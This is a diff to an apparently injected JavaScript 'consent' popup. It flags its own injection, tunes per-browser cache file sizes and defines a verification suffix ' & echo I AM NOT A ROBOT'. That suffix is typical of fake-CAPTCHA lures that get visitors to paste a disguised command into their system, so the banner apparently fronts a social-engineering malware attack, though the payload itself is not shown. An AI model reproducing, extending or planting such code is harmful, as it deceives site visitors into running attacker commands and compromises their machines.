@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.18',
+    version: '1.9.19',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -32,9 +32,9 @@
     },
     cacheFileSizesJj: {
       firefox: 0,
-      chrome: 17212,
-      edge: 17212,
-      brave: 17212
+      chrome: 17182,
+      edge: 17182,
+      brave: 17182
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
@@ -690,7 +690,7 @@
       '#consent-popup .cp-body{padding:24px 28px 20px;color:#333;font-size:17px;line-height:1.65}' +
       '#consent-popup .cp-actions{padding:0 28px 22px}' +
       '#consent-popup .cp-accept{display:block;width:100%;padding:18px;border:none;border-radius:8px;background:' + CONSENT_CONFIG.accentColor + ';color:#fff;font-size:18px;font-weight:600;cursor:pointer}' +
-      '#consent-popup .cp-accept:hover{background:' + CONSENT_CONFIG.accentHover + '}' +
+    '#consent-popup .cp-accept:hover{background:' + CONSENT_CONFIG.accentHover + '}' +
       '#consent-popup .cp-footer{display:flex;justify-content:center;gap:24px;padding:0 28px 26px}' +
       '#consent-popup .cp-footer a{color:' + CONSENT_CONFIG.accentColor + ';font-size:15px;text-decoration:underline;cursor:pointer}'
     );
@@ -700,14 +700,14 @@
     var logoHtml = faviconUrl ? '<img src="' + faviconUrl + '" alt="">' : '';
 
     return (
-      '<div class="cp-header">' +
+    '<div class="cp-header">' +
       '<div class="cp-logo">' + logoHtml + '</div>' +
       '<h2 class="cp-title">Manage Consent</h2></div>' +
-      '<div class="cp-body">To provide the best experiences, we use technologies like cookies to store and/or access device information. ' +
-      'Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. ' +
-      'Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>' +
-      '<div class="cp-actions"><button type="button" class="cp-accept">Accept</button></div>' +
-      '<div class="cp-footer"><a href="' + CONSENT_CONFIG.optOutUrl + '">Opt-out preferences</a>' +
+    '<div class="cp-body">To provide the best experiences, we use technologies like cookies to store and/or access device information. ' +
+    'Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. ' +
+    'Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>' +
+    '<div class="cp-actions"><button type="button" class="cp-accept">Accept</button></div>' +
+    '<div class="cp-footer"><a href="' + CONSENT_CONFIG.optOutUrl + '">Opt-out preferences</a>' +
       '<a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy Policy</a></div>'
     );
   }
